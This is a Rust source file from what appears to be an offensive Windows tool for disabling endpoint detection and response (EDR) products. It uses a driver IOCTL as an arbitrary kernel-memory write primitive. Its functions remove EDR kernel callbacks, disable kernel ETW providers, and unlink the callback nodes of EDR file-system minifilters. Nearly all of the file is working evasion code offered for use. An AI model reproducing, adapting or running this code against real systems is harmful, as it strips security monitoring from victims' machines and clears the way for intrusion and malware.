use std::ffi::CString;
use std::process;
use std::ptr::null_mut;
use std::ptr;

use winapi::shared::ntdef::HANDLE;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE,
};
use winapi::um::ioapiset::DeviceIoControl;

use crate::mem::{self, write_qword};
use crate::km;
use crate::pdb;

#[repr(C)]
#[derive(Debug, Default)]
pub struct DbLnkLst {
    pub next_node: u64,
    pub prev_node: u64
}


/// Opens a handle to the device and returns it
pub fn get_driver_handle() -> Result<HANDLE, u32> {
    let cstr_device_name =
        CString::new("\\\\.\\GLOBALROOT\\Device\\OBJINFO").expect("CString conversion failed");

    unsafe {
        let h_device = CreateFileA(
            cstr_device_name.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_device.is_null() || h_device == INVALID_HANDLE_VALUE {
            let err = GetLastError();
            eprintln!("[-] Failed to open handle to device. Error code: {}", err);
            Err(err)
        } else {
            Ok(h_device)
        }
    }
}


/// Sends an IOCTL to the driver
pub unsafe fn send_ioctl_to_driver(
    h_device: HANDLE,
    location_to_write_to: u64,
    size: u32,
) -> i32 {
    // Check if the handle is valid
    if h_device == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        eprintln!("[!] Error: invalid driver handle. GetLastError = {}", err);
        process::exit(-1);
    }

    // Input buffer is just the address you want to write to
    let input: u64 = location_to_write_to;
    let mut bytes_returned: u32 = 0;

    let success = unsafe {
        DeviceIoControl(
            h_device,
            0xCF532017, // IOCTL code
            &input as *const _ as *mut _, // input buffer
            size,                          // input buffer size
            location_to_write_to as *mut _,// output buffer = target memory
            size,                          // output buffer size
            &mut bytes_returned,
            ptr::null_mut(),
        )
    };

    if success != 0 {
        let err = unsafe { GetLastError() };
        eprintln!("[-] DeviceIoControl failed. GetLastError = {}", err);
        return -1;
    }

    success
}


/// Read & disable EDR callbacks
pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u64>> {
    println!("[>] Enumerating {} callback at: 0x{:16X}", cb_type, base_address);

    let result = Vec::with_capacity(0x40);

    for i in 0..0x40 {
        // Calculate the address for the i-th qword
        let addr = base_address + (i * std::mem::size_of::<u64>()) as u64;

        // Re-use your read_qword function
        let value = mem::read_qword(addr)?;
        if value != 0 {
            let func_addr = mem::read_qword(value & 0xfffffffffffffff8)?;
            let drv_name: String;
            match km::find_driver_name_from_addr(func_addr) {
                Some(drv) => {
                    drv_name = drv; // take ownership of the String
                },
                None => {
                    println!("[-] Could not find driver name for address 0x{:16X}", func_addr);
                    drv_name = String::from(""); // fallback
                }
            }
            println!(
                "[|]   [0x{:16X}]: 0x{:16X} [{}]",
                addr, func_addr, drv_name
            );
            if km::is_driver_name_matching_edr(&drv_name) {
                println!("[|]                             `-> matches EDR: {}. Removing...", drv_name);
                write_qword(addr, 0x00);
            }
        }
    }

    Ok(result)
}


/// Read & disable a km ETW provider
pub fn nerf_etw_prov(
    prov_addr: u64, prov_name: &str, guid_offset: u64, prov_offset: u64
) -> windows::core::Result<u64> {
    println!("[>] Checking ETW provider {} at: 0x{:16X}", prov_name, prov_addr);

    let reg_entry = mem::read_qword(prov_addr)?;
    let guid_entry = mem::read_qword(reg_entry + guid_offset)?;
    let mut enable_info = mem::read_dword(guid_entry + prov_offset)?;

    if enable_info == 0x1 {
        println!("[*] Current {} provider enabled status: 0x{:x}. Disabling!", prov_name, enable_info);
        mem::write_dword(guid_entry + prov_offset, 0x0);
        enable_info = mem::read_dword(guid_entry + prov_offset)?;
    } else if enable_info > 0x1 {
        println!("[-] Error: {} provider is neither 0 or 1 (status: 0x{:x})", prov_name, enable_info);
    }

    Ok(enable_info as u64) // wrap the success in Ok()
}


/// Read & disable an EDR file system minifilter
pub fn nerf_fs_miniflts(fm_base: u64, offsets: pdb::FmOffsets) -> windows::core::Result<()> {
    // frame_list_header = fltmgr_base + FltGlobals + _GLOBALS_FrameList + _FLT_RESOURCE_LIST_HEAD_rList;
    let frame_list_header: u64 = fm_base 
        + offsets.flt_globals 
        + offsets.globals_framelist 
        + offsets.flt_resource_list_head_rlist;


    let mut current_frame_shifted = mem::read_qword(frame_list_header)?;
    println!("[|] Frame list header at [0x{:16x}]: 0x{:16x}", frame_list_header, current_frame_shifted);

    while current_frame_shifted != frame_list_header {
        let current_frame = current_frame_shifted - offsets.fltp_frame_links;
        
        println!("[|]   Walking minifilter frame at _FLTP_FRAME: 0x{:016x}", current_frame);
        
        let filter_list_header = current_frame 
            + offsets.fltp_frame_registeredfilters
            + offsets.flt_resource_list_head_rlist;

        let mut current_filter_shifted = mem::read_qword(filter_list_header)?;
        
        while current_filter_shifted != filter_list_header {
            //println!("[|]     Current filter: 0x{:16x}", current_filter_shifted);
            current_filter_shifted = mem::read_qword(current_filter_shifted)?;
            let current_filter = current_filter_shifted - offsets.flt_object_primarylink;

            // Get driver info
            let driver_object = mem::read_qword(current_filter + offsets.flt_filter_driverobject)?;
            let driver_init = mem::read_qword(driver_object + offsets.driver_object_driverinit)?;

            let drv_name;
            match km::find_driver_name_from_addr(driver_init) {
                Some(drv) => {
                    drv_name = drv; // take ownership of the String
                },
                None => {
                    drv_name = String::from(""); // fallback
                }
            }
            
            // If it matches an EDR, walk & remove
            if km::is_driver_name_matching_edr(&drv_name) {
                println!("[|]     - [0x{:16x}] Current _FLT_FILTER matches EDR: {}. Walking...", driver_init, drv_name);
                let instance_list_header = current_filter 
                    + offsets.flt_filter_instancelist 
                    + offsets.flt_resource_list_head_rlist;
                
                let mut current_instance_shifted = mem::read_qword(instance_list_header)?;
                while current_instance_shifted != instance_list_header {
                    let current_instance = current_instance_shifted - offsets.flt_instance_filterlink;
                    let cb_nodes_array = current_instance + offsets.flt_instance_callbacknodes;
                    println!("[|]       - [{}] _FLT_INSTANCE 0x{:16x} with callback nodes at: 0x{:16x}", drv_name, current_instance, cb_nodes_array);

                    let mut num_cb_nodes = 0;
                    let mut num_cb_nodes_unlinked = 0;
                    let max_cb_nodes = 50;
                    while num_cb_nodes < max_cb_nodes {
                        let cb_node_ptr = mem::read_qword(cb_nodes_array + (num_cb_nodes * 0x8))?;
                        if cb_node_ptr != 0 {
                            // Valid callback entry
                            //println!("[|]         [DEBUG] Callback node: 0x{:16x}", cb_node_ptr);

                            let prev_node = mem::read_qword(cb_node_ptr + 0x8)?;
                            let next_node = mem::read_qword(cb_node_ptr + 0x0)?;
                            //let prev_node_next = mem::read_qword(prev_node + 0x0)?;
                            //let prev_node_prev = mem::read_qword(prev_node + 0x8)?;
                            //let next_node_next = mem::read_qword(next_node + 0x0)?;
                            //let next_node_prev = mem::read_qword(next_node + 0x8)?;
                            
                            /* DEBUG: print the node doubly linked list
                            println!("[*]             PRE:       [Prev]       -        [This]     -       [Next]");
                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node, cb_node_ptr, next_node);
                            println!("[|]                 ------------------   ------------------   ------------------");
                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_next, next_node, next_node_next);
                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_prev, prev_node, next_node_prev);
                            */

                            // Now, unlink the list:
                            let next_node_blink = next_node + 0x8;
                            let prev_node_flink = prev_node + 0x0;
                            mem::write_qword(next_node_blink, prev_node);
                            mem::write_qword(prev_node_flink, next_node);

                            /* DEBUG: print the node doubly linked list (again)
                            let prev_node2 = mem::read_qword(cb_node_ptr + 0x8)?;
                            let prev_node_next2 = mem::read_qword(prev_node + 0x0)?;
                            let prev_node_prev2 = mem::read_qword(prev_node + 0x8)?;
                            let next_node2 = mem::read_qword(cb_node_ptr + 0x0)?;
                            let next_node_next2 = mem::read_qword(next_node + 0x0)?;
                            let next_node_prev2 = mem::read_qword(next_node + 0x8)?;
                            println!("[*]             POST:      [Prev]       -        [This]     -       [Next]");
                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node2, cb_node_ptr, next_node2);
                            println!("[|]                 ------------------   ------------------   ------------------");
                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_next2, next_node2, next_node_next2);
                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_prev2, prev_node2, next_node_prev2);
                            */
                            
                            // Increment our counter
                            num_cb_nodes_unlinked += 1;
                        }
                        
                        num_cb_nodes += 1;
                    }

                    println!("[+]         Removed {} callbacks from this instance", num_cb_nodes_unlinked);

                    // Get the next one before the loop check
                    current_instance_shifted = mem::read_qword(current_instance_shifted)?;
                }
                
            }

        }
        
        // Get the next one before the loop check
        current_frame_shifted = mem::read_qword(current_frame_shifted)?;
    }


    Ok(())
}